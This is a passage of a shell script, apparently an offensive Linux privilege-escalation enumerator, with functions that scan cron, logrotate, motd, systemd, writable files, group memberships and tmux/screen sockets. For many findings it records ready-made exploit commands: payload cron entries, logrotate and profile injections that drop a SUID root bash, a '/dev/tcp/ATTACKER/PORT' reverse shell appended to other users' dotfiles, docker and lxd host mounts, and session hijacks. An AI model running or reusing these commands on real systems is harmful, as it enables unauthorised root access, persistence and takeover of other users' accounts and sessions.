                register_finding "PROC_CAP_SYS_ADMIN" "pid:$pid" \
                    "Pid $pid [$uid_label] has CAP_SYS_ADMIN: $cmd" 85 "capabilities"
            fi
            if [ $(( cap_dec & (1 << 19) )) -ne 0 ]; then
                register_finding "PROC_CAP_PTRACE" "pid:$pid" \
                    "Pid $pid [$uid_label] has CAP_SYS_PTRACE: $cmd" 75 "capabilities"
            fi
        fi
    done

    return 0
}
map_cron() {
    # CRITICAL-3: /etc/periodic/ Alpine. Plus /etc/crontab, /etc/cron.d/,
    # /var/spool/cron/crontabs/, systemd timers, anacron, fcron.

    local cf
    # ── /etc/crontab + /etc/cron.d/* ─────────────────────────────────────────
    for cf in /etc/crontab /etc/cron.d/*; do
        [ -r "$cf" ] || continue
        register_finding "CRON_FILE" "$cf" "Crontab entry source: $cf" 50 "cron"
        # Writable crontab = direct execution path (often as root).
        if verify_actually_writable "$cf" 2>/dev/null; then
            register_finding "CRON_WRITABLE" "$cf" \
                "CRITICAL: cron file writable — add malicious entry" \
                97 "cron"
            register_exploit "CRON_WRITABLE" "$cf" \
                "echo '* * * * * root /tmp/payload.sh' >> $cf"
        fi
        # Extract referenced commands and check if any are writable.
        grep -v '^[[:space:]]*#' "$cf" 2>/dev/null | grep -v '^[[:space:]]*$' | \
        while IFS= read -r line; do
            # Skip variable assignments
            case "$line" in
                *=*) continue ;;
            esac
            # Cron format: m h dom mon dow user command...
            # Extract command (column 7+ for /etc/crontab; 6+ for user crontabs)
            local cmd
            cmd=$(printf '%s' "$line" | awk '{
                for(i=1;i<=NF;i++) {
                    if($i ~ /^[/]/) { for(j=i;j<=NF;j++) printf "%s ", $j; exit }
                }
            }')
            cmd=$(printf '%s' "$cmd" | sed 's/[[:space:]]*$//')
            [ -z "$cmd" ] && continue
            # First token = the script path
            local script
            script=$(printf '%s' "$cmd" | awk '{print $1}')
            [ -f "$script" ] || continue
            if verify_actually_writable "$script" 2>/dev/null; then
                register_finding "CRON_SCRIPT_WRITABLE" "$script" \
                    "Cron-invoked script writable: $script (from $cf)" \
                    96 "cron"
            fi
            # Directory containing it writable = swap the script.
            local script_dir
            script_dir=$(dirname "$script")
            if verify_actually_writable "$script_dir" 2>/dev/null; then
                register_finding "CRON_SCRIPT_DIR_WRITABLE" "$script_dir" \
                    "Cron script dir writable: $script_dir (script: $script)" \
                    88 "cron"
            fi
            # Wildcard injection check (HIGH-6 stub — full impl in Engine 2).
            case "$cmd" in
                *tar*\**)
                    register_finding "CRON_WILDCARD_TAR" "$cf" \
                        "tar wildcard cron — --checkpoint injection: $cmd" \
                        88 "cron"
                    ;;
                *rsync*\**)
                    register_finding "CRON_WILDCARD_RSYNC" "$cf" \
                        "rsync wildcard cron — -e injection: $cmd" 85 "cron"
                    ;;
                *chown*\**|*chmod*\**)
                    register_finding "CRON_WILDCARD_PERM" "$cf" \
                        "chown/chmod wildcard cron: $cmd" 70 "cron"
                    ;;
            esac
        done
    done

    # ── /etc/periodic/{hourly,daily,weekly,monthly} (CRITICAL-3 Alpine) ──────
    local pd
    for pd in /etc/periodic/hourly /etc/periodic/daily \
              /etc/periodic/weekly /etc/periodic/monthly \
              /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly; do
        [ -d "$pd" ] || continue
        local s
        for s in "$pd"/*; do
            [ -f "$s" ] || continue
            register_finding "CRON_PERIODIC" "$s" \
                "Periodic script: $s" 55 "cron_periodic"
            if verify_actually_writable "$s" 2>/dev/null; then
                register_finding "CRON_PERIODIC_WRITABLE" "$s" \
                    "CRITICAL: periodic script writable: $s" \
                    95 "cron_periodic"
            fi
        done
        # Directory writable = drop a new script.
        if verify_actually_writable "$pd" 2>/dev/null; then
            register_finding "CRON_PERIODIC_DIR" "$pd" \
                "Periodic dir writable: $pd — drop new script" 92 "cron_periodic"
        fi
    done

    # ── /var/spool/cron/ user crontabs ────────────────────────────────────────
    local sp
    for sp in /var/spool/cron /var/spool/cron/crontabs /var/spool/cron/tabs; do
        [ -d "$sp" ] || continue
        local uc
        for uc in "$sp"/*; do
            [ -f "$uc" ] || continue
            [ -r "$uc" ] || continue
            register_finding "CRON_USER_TAB" "$uc" \
                "User crontab readable: $(basename "$uc") at $uc" 60 "cron_user"
            if verify_actually_writable "$uc" 2>/dev/null; then
                register_finding "CRON_USER_TAB_WRITABLE" "$uc" \
                    "User crontab writable: $uc" 90 "cron_user"
            fi
        done
    done

    # ── systemd timers ────────────────────────────────────────────────────────
    if [ "$INIT" = "systemd" ] && command -v systemctl >/dev/null 2>&1; then
        local timers
        timers=$(safe_run 5 systemctl list-timers --all --no-legend 2>/dev/null)
        if [ -n "$timers" ]; then
            printf '%s\n' "$timers" | awk '{print $NF}' | while IFS= read -r tname; do
                case "$tname" in
                    *.timer) : ;;
                    *) continue ;;
                esac
                register_finding "SYSTEMD_TIMER" "$tname" \
                    "Active systemd timer: $tname" 40 "cron_systemd"
            done
        fi
    fi

    # ── anacron ───────────────────────────────────────────────────────────────
    if [ -r /etc/anacrontab ]; then
        register_finding "CRON_ANACRON" "/etc/anacrontab" \
            "anacrontab present" 40 "cron_anacron"
        if verify_actually_writable /etc/anacrontab 2>/dev/null; then
            register_finding "CRON_ANACRON_WRITABLE" "/etc/anacrontab" \
                "CRITICAL: anacrontab writable" 95 "cron_anacron"
        fi
    fi

    # ── fcron ────────────────────────────────────────────────────────────────
    if [ -d /var/spool/fcron ]; then
        local fc
        for fc in /var/spool/fcron/*; do
            [ -f "$fc" ] || continue
            register_finding "CRON_FCRON" "$fc" "fcron entry: $fc" 55 "cron_fcron"
        done
    fi

    return 0
}

map_logrotate() {
    local _f _script

    # Writable logrotate drop-in configs — inject postrotate/prerotate command
    apex_find /etc/logrotate.d -type f 2>/dev/null | while IFS= read -r _f; do
        [ -r "$_f" ] || continue
        if verify_actually_writable "$_f" 2>/dev/null; then
            register_finding "LOGROTATE_CONF_WRITABLE" "$_f" \
                "logrotate config writable: $_f — inject 'postrotate <cmd> endscript' to run as root on log rotation" \
                85 "cron"
            register_exploit "LOGROTATE_CONF_WRITABLE" "$_f" \
                "printf '\npostrotate\n  cp /bin/bash ${APEX_EXEC_DIR:-/tmp}/rootbash; chmod 4755 ${APEX_EXEC_DIR:-/tmp}/rootbash\nendscript\n' >> $_f  # triggered next time logrotate runs (usually daily cron)"
        fi

        # Postrotate/prerotate script referenced inside this config — check if script itself writable
        grep -oE '^\s*(post|pre)rotate\s+\S+' "$_f" 2>/dev/null | \
        grep -oE '/[^[:space:]]+' | while IFS= read -r _script; do
            [ -f "$_script" ] || continue
            verify_actually_writable "$_script" 2>/dev/null || continue
            register_finding "LOGROTATE_INJECT" "$_script" \
                "logrotate postrotate script writable: $_script — appended code runs as root on log rotation" \
                88 "cron"
            register_exploit "LOGROTATE_INJECT" "$_script" \
                "printf '#!/bin/bash -p\ncp /bin/bash ${APEX_EXEC_DIR:-/tmp}/rootbash; chmod 4755 ${APEX_EXEC_DIR:-/tmp}/rootbash\n' >> $_script"
        done
    done
    return 0
}

map_motd() {
    local _f

    # /etc/update-motd.d/ scripts run as root on every SSH login / PAM session open
    apex_find /etc/update-motd.d -type f 2>/dev/null | while IFS= read -r _f; do
        verify_actually_writable "$_f" 2>/dev/null || continue
        register_finding "MOTD_INJECT" "$_f" \
            "MOTD script writable: $_f — runs as root on every SSH login, no trigger wait needed" \
            92 "cron"
        register_exploit "MOTD_INJECT" "$_f" \
            "printf '#!/bin/bash -p\ncp /bin/bash ${APEX_EXEC_DIR:-/tmp}/rootbash; chmod 4755 ${APEX_EXEC_DIR:-/tmp}/rootbash\n' >> $_f  # then: ssh localhost"
    done

    # /etc/profile.d/ scripts sourced for every interactive login (root or user switching)
    apex_find /etc/profile.d -name "*.sh" 2>/dev/null | while IFS= read -r _f; do
        verify_actually_writable "$_f" 2>/dev/null || continue
        # Only flag if owned by root (attacker can make it run as root via su -)
        local _fown
        _fown=$(stat -c '%U' "$_f" 2>/dev/null)
        [ "$_fown" = "root" ] || continue
        register_finding "PROFILE_D_INJECT" "$_f" \
            "Root-owned /etc/profile.d script writable: $_f — sourced on any interactive login" \
            80 "cron"
        register_exploit "PROFILE_D_INJECT" "$_f" \
            "printf 'cp /bin/bash ${APEX_EXEC_DIR:-/tmp}/rootbash; chmod 4755 ${APEX_EXEC_DIR:-/tmp}/rootbash\n' >> $_f  # then: su - or new SSH session"
    done
    return 0
}

map_systemd() {
    # Scan systemd unit files for ExecStart that points to a writable
    # binary/script, and EnvironmentFile that's writable. /etc/systemd has
    # priority over /lib/systemd (admin overrides). Also /run/systemd.

    [ "$INIT" = "systemd" ] || return 0

    local unit_dirs="/etc/systemd/system /usr/lib/systemd/system /lib/systemd/system /run/systemd/system /etc/systemd/user /usr/lib/systemd/user"
    local d uf
    for d in $unit_dirs; do
        [ -d "$d" ] || continue
        # apex_find for unit files, depth-limited so we don't walk forever.
        local units
        units=$(safe_run 10 apex_find "$d" -maxdepth 3 -type f \
                  \( -name '*.service' -o -name '*.timer' -o -name '*.socket' \) \
                  2>/dev/null)
        printf '%s\n' "$units" | while IFS= read -r uf; do
            [ -r "$uf" ] || continue
            # Writable unit file = trivially modify ExecStart to our payload.
            if verify_actually_writable "$uf" 2>/dev/null; then
                register_finding "SYSTEMD_UNIT_WRITABLE" "$uf" \
                    "CRITICAL: systemd unit writable: $uf — change ExecStart" \
                    96 "systemd"
                register_exploit "SYSTEMD_UNIT_WRITABLE" "$uf" \
                    "Edit ExecStart= in $uf to point to your payload; sudo systemctl daemon-reload && sudo systemctl restart $(basename "$uf")"
            fi
            # C4: detect User= line up-front so every ExecStart row inherits it.
            # Default to "root" when User= is absent (systemd's actual default).
            local unit_user
            unit_user=$(grep -m1 -E "^User=" "$uf" 2>/dev/null | cut -d= -f2 | tr -d ' \t')
            [ -z "$unit_user" ] && unit_user="root"

            # Parse ExecStart / ExecStartPre / ExecStartPost / EnvironmentFile.
            local val
            grep -E "^Exec(Start|StartPre|StartPost|Stop)=" "$uf" 2>/dev/null | \
            while IFS= read -r exec_line; do
                val="${exec_line#*=}"
                # Strip leading flags like - ! @ +
                val=$(printf '%s' "$val" | sed 's/^[!@+\-]*//;s/^[[:space:]]*//')
                # First token = the binary/script.
                local target
                target=$(printf '%s' "$val" | awk '{print $1}')
                [ -z "$target" ] && continue

                # C4 (runs BEFORE -e guard — script may live in an unreadable
                # dir like /opt/bank that we can't stat as our user; the unit
                # itself still tells us it exists and who runs it).
                local script_arg=""
                case "$target" in
                    */python|*/python2|*/python3|*/perl|*/ruby|*/node|*/php|*/bash|*/sh|*/ksh|*/zsh)
                        script_arg=$(printf '%s' "$val" | awk '{print $2}')
                        ;;
                esac
                local c4_target="$target" c4_label="ExecStart binary"
                if [ -n "$script_arg" ] && _in_custom_path "$script_arg"; then
                    c4_target="$script_arg"
                    c4_label="ExecStart script (interpreter arg)"
                fi
                local c4_emit=0
                if [ "$c4_target" = "$target" ]; then
                    _in_custom_path "$target" && ! _is_pkg_owned "$target" && c4_emit=1
                else
                    c4_emit=1
                fi
                if [ "$c4_emit" = "1" ] && [ "$unit_user" != "${APEX_USER:-__nobody__}" ]; then
                    local c4_vec c4_conf c4_lens c4_desc_tail=""
                    if [ "$unit_user" = "root" ]; then
                        c4_vec="CUSTOM_SYSTEMD_ROOT_SERVICE"; c4_conf=78; c4_lens="systemd_custom"
                    else
                        c4_vec="CUSTOM_SYSTEMD_USER_SERVICE"; c4_conf=72; c4_lens="systemd_lateral"
                    fi
                    if [ ! -e "$c4_target" ]; then
                        c4_desc_tail=" (unreadable — referenced but we lack access; pivot to $unit_user)"
                    elif verify_actually_writable "$c4_target" 2>/dev/null; then
                        register_finding "${c4_vec}_WRITABLE" "$c4_target" \
                            "CRITICAL: writable $c4_label run by $unit_user via $(basename "$uf"): $c4_target" \
                            96 "$c4_lens"
                        # Fall through to also register the base finding so chains.sorted shows context.
                    fi
                    register_finding "$c4_vec" "$c4_target" \
                        "Service runs as $unit_user, $c4_label: $c4_target (unit: $(basename "$uf"))$c4_desc_tail" \
                        "$c4_conf" "$c4_lens"
                fi

                # All remaining writability checks require the file to be readable/stat-able.
                [ -e "$target" ] || continue
                if verify_actually_writable "$target" 2>/dev/null; then
                    register_finding "SYSTEMD_EXEC_WRITABLE" "$target" \
                        "systemd ExecStart target writable: $target (from $uf)" \
                        94 "systemd"
                fi
                # Directory containing target writable = swap it.
                local td
                td=$(dirname "$target")
                if verify_actually_writable "$td" 2>/dev/null; then
                    register_finding "SYSTEMD_EXEC_DIR_WRITABLE" "$td" \
                        "systemd ExecStart dir writable: $td (target: $target)" \
                        85 "systemd"
                fi
            done
            grep -E "^EnvironmentFile=" "$uf" 2>/dev/null | while IFS= read -r env_line; do
                local envf
                envf="${env_line#*=}"
                envf=$(printf '%s' "$envf" | sed 's/^[!@+\-]*//;s/^[[:space:]]*//')
                [ -e "$envf" ] || continue
                if verify_actually_writable "$envf" 2>/dev/null; then
                    register_finding "SYSTEMD_ENVFILE_WRITABLE" "$envf" \
                        "systemd EnvironmentFile writable: $envf (from $uf)" \
                        90 "systemd"
                fi
            done
        done
    done

    return 0
}
map_write_surface() {
    # Find writable files/dirs in privileged locations. Every reported entry
    # passes verify_actually_writable() (CRITICAL-6). High-value targets get
    # their own categories; everything else lumped as WRITE_GENERIC.

    # ── Sensitive paths to scan for writability ──────────────────────────────
    local roots="/etc /usr /opt /srv /var /root /lib /lib64"
    local r path
    for r in $roots; do
        [ -d "$r" ] || continue
        # Top-level writable check on the directory itself.
        if verify_actually_writable "$r" 2>/dev/null; then
            register_finding "WRITE_TOPLEVEL_DIR" "$r" \
                "Privileged dir writable: $r" 88 "write"
        fi
    done

    # ── Sensitive specific files (always check) ──────────────────────────────
    local f
    for f in /etc/sudoers /etc/sudoers.d /etc/shadow /etc/passwd /etc/group \
             /etc/gshadow /etc/hosts /etc/resolv.conf /etc/ssh/sshd_config \
             /etc/pam.d /etc/pam.conf /etc/login.defs /etc/ld.so.conf \
             /etc/ld.so.preload /etc/sysctl.conf /etc/fstab /etc/mtab \
             /etc/issue /etc/motd /etc/profile /etc/bash.bashrc \
             /etc/environment /etc/profile.d; do
        [ -e "$f" ] || continue
        if verify_actually_writable "$f" 2>/dev/null; then
            register_finding "WRITE_SENSITIVE" "$f" \
                "Sensitive system file writable: $f" 92 "write"
        fi
    done

    # ── /etc/profile.d/*.sh writable (MEDIUM-5) ──────────────────────────────
    if [ -d /etc/profile.d ]; then
        local pf
        for pf in /etc/profile.d/*.sh; do
            [ -f "$pf" ] || continue
            if verify_actually_writable "$pf" 2>/dev/null; then
                register_finding "WRITE_PROFILE_D" "$pf" \
                    "profile.d script writable: $pf — executes on every login" \
                    87 "write"
            fi
        done
    fi

    # ── Bulk scan: writable executables under privileged roots ───────────────
    # We trust find -writable (FIND_HAS_WRITABLE) when present, then verify
    # each result. Without -writable, fall back to file-mode + ACL checks.
    local write_arg=""
    [ "$FIND_HAS_WRITABLE" = "1" ] && write_arg="-writable"

    local found
    found=$(safe_run 30 apex_find /etc -type f $write_arg 2>/dev/null | head -200)
    [ -z "$found" ] || printf '%s\n' "$found" | while IFS= read -r path; do
        verify_actually_writable "$path" 2>/dev/null || continue
        register_finding "WRITE_GENERIC" "$path" \
            "Writable file under /etc: $path" 65 "write"
    done

    # /usr/local/bin etc. — common PATH dirs that may be writable.
    local pdir
    for pdir in /usr/local/bin /usr/local/sbin /usr/local/lib /opt/bin; do
        [ -d "$pdir" ] || continue
        if verify_actually_writable "$pdir" 2>/dev/null; then
            register_finding "WRITE_PATHDIR" "$pdir" \
                "PATH-like dir writable: $pdir — drop binaries here" 85 "write"
        fi
    done

    # D10: Other users' home dir dotfile injection
    # If we can write .bashrc/.profile/.bash_profile of another user, we get
    # code execution when they log in.
    local me
    me=$(id -un 2>/dev/null)
    if [ -r /etc/passwd ]; then
        local uname uhome uuid
        while IFS=: read -r uname _ uuid _ _ uhome _; do
            case "$uuid" in ''|*[!0-9]*) continue ;; esac
            [ "$uname" = "$me" ] && continue        # skip self
            [ -d "$uhome" ] || continue
            local dotf
            for dotf in "$uhome/.bashrc" "$uhome/.bash_profile" "$uhome/.profile" \
                        "$uhome/.zshrc" "$uhome/.bash_login" "$uhome/.bash_logout" \
                        "$uhome/.config/fish/config.fish"; do
                [ -e "$dotf" ] || continue
                if verify_actually_writable "$dotf" 2>/dev/null; then
                    local dot_conf=85
                    [ "$uuid" -eq 0 ] && dot_conf=97
                    register_finding "WRITE_USER_DOTFILE" "$dotf" \
                        "Shell dotfile writable for user $uname (uid=$uuid): $dotf — executes on login" \
                        "$dot_conf" "write"
                    register_exploit "WRITE_USER_DOTFILE" "$dotf" \
                        "echo 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1' >> $dotf"
                fi
            done
        done < /etc/passwd
    fi

    # D10: /root/.bashrc writable = root execution on next root login/su
    for f in /root/.bashrc /root/.bash_profile /root/.profile /root/.bash_login; do
        [ -e "$f" ] || continue
        if verify_actually_writable "$f" 2>/dev/null; then
            register_finding "WRITE_ROOT_DOTFILE" "$f" \
                "CRITICAL: root shell dotfile writable: $f — executes on root login" \
                99 "write"
            register_exploit "WRITE_ROOT_DOTFILE" "$f" \
                "echo 'chmod u+s /bin/bash' >> $f  # trigger on next root login"
        fi
    done

    # GAP 4: Foreign-owned files inside MY writable dirs → cron-hijack candidate.
    # Pure static replacement for the pspy dir-hijack signal. If a cron or service
    # runs the foreign file, replacing it gives code execution as that user.
    # Scans every other user's home and a couple of common shared roots, but only
    # if we can write to that dir. This is exactly the layne→scott case:
    # /home/layne.stanley/ is 0777, contains scott-owned bankSmarter_backup.sh.
    local _apex_user
    _apex_user="${APEX_USER:-$(id -un 2>/dev/null)}"
    local _check_dirs=""
    if [ -r /etc/passwd ]; then
        local _u _h
        while IFS=: read -r _u _ _ _ _ _h _; do
            [ -n "$_h" ] && [ -d "$_h" ] || continue
            [ "$_u" = "$_apex_user" ] && continue
            verify_actually_writable "$_h" 2>/dev/null || continue
            _check_dirs="$_check_dirs $_h"
        done < /etc/passwd
    fi
    for r in /opt /srv /var/tmp /tmp; do
        [ -d "$r" ] || continue
        verify_actually_writable "$r" 2>/dev/null || continue
        _check_dirs="$_check_dirs $r"
    done

    local _wdir _foreign _fown _fbase _is_script _is_exec
    for _wdir in $_check_dirs; do
        # Limit to top-level (the script is the lure, not its dependencies).
        # apex_find handles /proc /sys prunes already.
        apex_find "$_wdir" -maxdepth 1 -type f 2>/dev/null | \
            head -50 | while IFS= read -r _foreign; do
            [ -f "$_foreign" ] || continue
            _fown=$(stat -c '%U' "$_foreign" 2>/dev/null)
            [ -z "$_fown" ] && continue
            [ "$_fown" = "$_apex_user" ] && continue
            _fbase=$(basename -- "$_foreign")
            # Skip dotfiles / config noise — those have their own categories
            # (WRITE_USER_DOTFILE etc.) and are not the cron-hijack signal.
            case "$_fbase" in .*) continue ;; esac
            # Skip APEX's own deployment artifacts.
            case "$_foreign" in
                /tmp/apex_*|/tmp/trace_*|/tmp/.apex_*|/dev/shm/.apex_*|/tmp/sh-thd*|/tmp/tmp.*)
                    continue ;;
            esac
            # Only flag plausibly-cron-executable files: executable bit set
            # OR a recognised script extension. Plain text / data files in
            # someone's home dir aren't going to be run by a daemon.
            _is_script=0
            case "$_fbase" in
                *.sh|*.bash|*.zsh|*.py|*.pl|*.rb|*.lua|*.js|*.php|*.ts) _is_script=1 ;;
            esac
            _is_exec=0
            [ -x "$_foreign" ] && _is_exec=1
            [ "$_is_script" = "1" ] || [ "$_is_exec" = "1" ] || continue
            register_finding "FOREIGN_FILE_IN_WRITABLE_DIR" "$_foreign" \
                "File owned by $_fown inside YOUR writable dir $_wdir — if cron/service runs it, delete+recreate hijacks it" \
                80 "write_surface"
            register_exploit "FOREIGN_FILE_IN_WRITABLE_DIR" "$_foreign" \
                "rm -f $_foreign; printf '#!/bin/bash -p\ncp /bin/bash ${APEX_EXEC_DIR:-/tmp}/rootbash; chmod 4755 ${APEX_EXEC_DIR:-/tmp}/rootbash\n' > $_foreign; chmod +x $_foreign; sleep 65; ${APEX_EXEC_DIR:-/tmp}/rootbash -p"
        done
    done

    return 0
}
map_groups() {
    # MEDIUM-3: not just `id` — also /etc/group cross-reference.
    # Flag privileged groups (docker / lxd / disk / shadow / sudo / wheel /
    # adm / video / etc.) that give direct or indirect root.

    local username kernel_groups etc_groups all_groups
    username="${APEX_USER:-$(whoami 2>/dev/null)}"
    [ -z "$username" ] && return 0

    kernel_groups=$(id -Gn 2>/dev/null | tr ' ' '\n')

    if [ -r /etc/group ]; then
        etc_groups=$(awk -F: -v u="$username" '
            { split($4, mem, ",");
              for (m in mem) if (mem[m] == u) print $1 }' \
            /etc/group 2>/dev/null)
    fi

    # Combine + dedupe
    all_groups=$(printf '%s\n%s\n' "$kernel_groups" "$etc_groups" | sort -u | grep -v '^$')

    local g
    printf '%s\n' "$all_groups" | while IFS= read -r g; do
        [ -z "$g" ] && continue
        case "$g" in
            root|wheel)
                register_finding "GROUP_ROOT" "$g" \
                    "Member of root/wheel group — direct privilege" 95 "groups"
                ;;
            sudo|admin|sudoers)
                register_finding "GROUP_SUDO" "$g" \
                    "Member of sudo group — sudo access (check sudo -l)" 85 "groups"
                ;;
            docker)
                register_finding "GROUP_DOCKER" "$g" \
                    "Member of docker group — instant root via container mount" \
                    97 "groups"
                register_exploit "GROUP_DOCKER" "$g" \
                    "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
                ;;
            lxd|lxc)
                register_finding "GROUP_LXD" "$g" \
                    "Member of lxd/lxc group — root via container privileged mode" \
                    96 "groups"
                register_exploit "GROUP_LXD" "$g" \
                    "lxc init alpine ctr -c security.privileged=true; lxc config device add ctr mntdev disk source=/ path=/mnt/host; lxc start ctr; lxc exec ctr sh"
                ;;
            disk)
                register_finding "GROUP_DISK" "$g" \
                    "Member of disk group — raw block device read = read /etc/shadow" \
                    92 "groups"
                register_exploit "GROUP_DISK" "$g" \
                    "debugfs /dev/sdaN — interactive read of any file, including /etc/shadow"
                ;;
            shadow)
                register_finding "GROUP_SHADOW" "$g" \
                    "Member of shadow group — /etc/shadow readable, crack hashes" \
                    90 "groups"
                ;;
            adm)
                register_finding "GROUP_ADM" "$g" \
                    "Member of adm group — reads system logs (credentials)" \
                    70 "groups"
                ;;
            video)
                register_finding "GROUP_VIDEO" "$g" \
                    "Member of video group — /dev/fb0 framebuffer access (rare vector)" \
                    50 "groups"
                ;;
            sys|kmem)
                register_finding "GROUP_KMEM" "$g" \
                    "Member of $g — kernel memory access" 88 "groups"
                ;;
            tty|dialout)
                register_finding "GROUP_TTY" "$g" \
                    "Member of $g — terminal/serial device access" 50 "groups"
                ;;
            # D11: tmux/screen session hijacking groups
            tmuxshare|tmuxusers|tmuxshared)
                register_finding "GROUP_TMUX_HIJACK" "$g" \
                    "Member of $g — can attach to other users' tmux sessions (lateral pivot)" \
                    75 "groups"
                # Find actual accessible sockets NOW — /var/run is often NOT
                # a symlink to /run on all distros, search both explicitly.
                # Use temp file to avoid subshell variable scope bug.
                local _tsock_cmd=""
                local _tsock_tmp
                _tsock_tmp=$(mktemp 2>/dev/null) || _tsock_tmp="/tmp/_apex_tsock_$$"
                local _me_g
                _me_g=$(id -un 2>/dev/null)
                find /tmp /run /var/run /var/lib -type s -readable 2>/dev/null | \
                    grep -iE 'tmux|screen' | head -10 | \
                    while IFS= read -r sk; do
                        local _sk_owner
                        _sk_owner=$(stat -c '%U' "$sk" 2>/dev/null)
                        [ "$_sk_owner" = "$_me_g" ] && continue
                        printf 'tmux -S %s list-sessions 2>/dev/null && tmux -S %s attach  # owner=%s\n' \
                            "$sk" "$sk" "${_sk_owner:-?}" >> "$_tsock_tmp"
                    done
                if [ -s "$_tsock_tmp" ]; then
                    _tsock_cmd=$(cat "$_tsock_tmp" 2>/dev/null)
                fi
                rm -f "$_tsock_tmp" 2>/dev/null
                if [ -z "$_tsock_cmd" ]; then
                    _tsock_cmd="# No live tmux sockets found yet — run at runtime:"$'\n'"find /tmp /run /var/run -type s -readable 2>/dev/null | grep -iE 'tmux|screen'"$'\n'"# Then: tmux -S <socket_path> list-sessions && tmux -S <socket_path> attach"
                fi
                register_exploit "GROUP_TMUX_HIJACK" "$g" "$_tsock_cmd"
                ;;
            mail|news|uucp|backup|operator|games|nogroup|users|input|lpadmin|netdev|bluetooth|plugdev|cdrom|floppy|tape|scanner|saned|pulse|audio|crontab|systemd-journal|systemd-network|systemd-resolve|messagebus|colord|geoclue|rtkit|avahi|nm-openvpn|gnome-initial-setup|polkitd|usbmux|render|kvm|"$username")
                : # benign / informational
                ;;
            *)
                register_finding "GROUP_OTHER" "$g" \
                    "Member of group: $g" 30 "groups"
                ;;
        esac
    done

    # D11: Detect accessible tmux sockets (regardless of group membership)
    local tsock
    for tsock in /tmp/tmux-*/default /tmp/tmux-*/* /run/tmux-*/default; do
        [ -e "$tsock" ] || continue
        if [ -r "$tsock" ] && [ -w "$tsock" ]; then
            local sock_owner
            sock_owner=$(stat -c '%U' "$tsock" 2>/dev/null)
            local me_check
            me_check=$(id -un 2>/dev/null)
            [ "$sock_owner" = "$me_check" ] && continue  # own socket = not hijack
            register_finding "TMUX_SOCKET_HIJACK" "$tsock" \
                "tmux socket accessible (owned by $sock_owner): $tsock — attach to live session" \
                80 "groups"
            register_exploit "TMUX_SOCKET_HIJACK" "$tsock" \
                "tmux -S $tsock attach"
        fi
    done

    # D11: screen session hijacking — /var/run/screen/S-<user>/
    if [ -d /var/run/screen ]; then
        apex_find /var/run/screen -type s 2>/dev/null | while IFS= read -r scrsock; do
            [ -r "$scrsock" ] && [ -w "$scrsock" ] || continue
            local scr_owner
            scr_owner=$(stat -c '%U' "$scrsock" 2>/dev/null)
            local me_scr
            me_scr=$(id -un 2>/dev/null)
            [ "$scr_owner" = "$me_scr" ] && continue
            register_finding "SCREEN_SOCKET_HIJACK" "$scrsock" \
                "screen socket accessible (owned by $scr_owner): $scrsock — attach to live session" \
                78 "groups"
            register_exploit "SCREEN_SOCKET_HIJACK" "$scrsock" \
                "screen -x $scr_owner/"
        done
    fi

    # Inheritance/freshness mismatch (MEDIUM-3)
    local diff
    diff=$(diff <(printf '%s\n' "$kernel_groups" | sort -u) \
                <(printf '%s\n' "$etc_groups"    | sort -u) 2>/dev/null \
                | grep -E '^[<>]')
    if [ -n "$diff" ]; then
        register_finding "GROUP_STALE_SESSION" "$username" \
            "Group membership mismatch session vs /etc/group — try newgrp/relogin" \
            45 "groups"
    fi

    return 0
}
map_custom_binaries() {
    # Scan non-stock executables in custom PATH dirs.
    # Unlike map_suid_sgid (only SUID), this catches ALL executables in:
    #   /usr/local/bin /usr/local/sbin /opt/*/bin /opt/*/sbin
    #   /home/*/bin /srv/*/bin /app /apps /usr/games
    # For each: strings → relative interpreter calls → PATH hijack synthesis.
    # Cross-references writable exec dirs → CUSTOM_BIN_PATH_HIJACK at 95%.

    [ "$HAS_STRINGS" = "1" ] || return 0

    # Directories to scan (non-standard, likely custom binaries)
    local _cb_dirs="/usr/local/bin /usr/local/sbin /opt /srv /app /apps /usr/games"

    # Stock binaries from package manager — skip these (they're expected)
    local _stock_tmp
    _stock_tmp=$(mktemp 2>/dev/null) || _stock_tmp="/tmp/_apex_stock_$$"
    if command -v dpkg >/dev/null 2>&1; then
        dpkg -S /usr/local/bin /usr/local/sbin 2>/dev/null | \
            awk -F': ' '{print $2}' >> "$_stock_tmp" 2>/dev/null
    elif command -v rpm >/dev/null 2>&1; then
        rpm -qf /usr/local/bin/* 2>/dev/null | grep -v 'not owned' | \
            awk '{print $NF}' >> "$_stock_tmp" 2>/dev/null
    fi

    # Writable directories on PATH — used for PATH hijack synthesis
    local _path_dirs
    _path_dirs=$(printf '%s' "${PATH:-/usr/bin:/bin}" | tr ':' '\n')

    local _writable_exec_dirs=""
    local _wed_tmp
    _wed_tmp=$(mktemp 2>/dev/null) || _wed_tmp="/tmp/_apex_wed_$$"
    printf '%s\n' "$_path_dirs" | while IFS= read -r pd; do
        [ -d "$pd" ] || continue
        if verify_actually_writable "$pd" 2>/dev/null; then
            printf '%s\n' "$pd" >> "$_wed_tmp"
        fi
    done
    # /tmp /dev/shm — classic writable+exec locations (check noexec)
    for _xdir in /tmp /dev/shm /run/shm; do
        [ -d "$_xdir" ] || continue
        # Quick exec test — write a dummy, mark +x, try exec
        local _xtest
        _xtest=$(mktemp "$_xdir/_apx_XXXXXX" 2>/dev/null) || continue
        printf '#!/bin/sh\n: \n' > "$_xtest" 2>/dev/null
        chmod +x "$_xtest" 2>/dev/null
        if "$_xtest" 2>/dev/null; then
            printf '%s\n' "$_xdir" >> "$_wed_tmp"
        fi
        rm -f "$_xtest" 2>/dev/null
    done
    [ -s "$_wed_tmp" ] && _writable_exec_dirs=$(cat "$_wed_tmp" 2>/dev/null)
    rm -f "$_wed_tmp" 2>/dev/null

    # Scan each custom dir for executables
    local _d
    for _d in $_cb_dirs; do
        [ -d "$_d" ] || continue
        apex_find "$_d" -type f -executable 2>/dev/null | head -50 | \
        while IFS= read -r bin; do
            [ -r "$bin" ] || continue
            [ -f "$bin" ] || continue
            local _bbase
            _bbase=$(basename "$bin")

            # Skip known-stock interpreters and wrappers
            case "$_bbase" in
                python*|perl*|ruby*|node*|php*|java*|bash*|sh|dash|zsh|ksh|tcsh|fish) continue ;;
                gcc*|g++*|cc*|make*|ld|strip|ar|nm|objdump|readelf)                  continue ;;
                pip*|gem*|bundle*|npm*|yarn*|cargo*|go*|rustc*)                       continue ;;
                *.sample)                                                               continue ;;
            esac

            # Skip .git internals — hook samples are never executed by git
            case "$bin" in */.git/*) continue ;; esac

            # Skip stock (package-managed) binaries
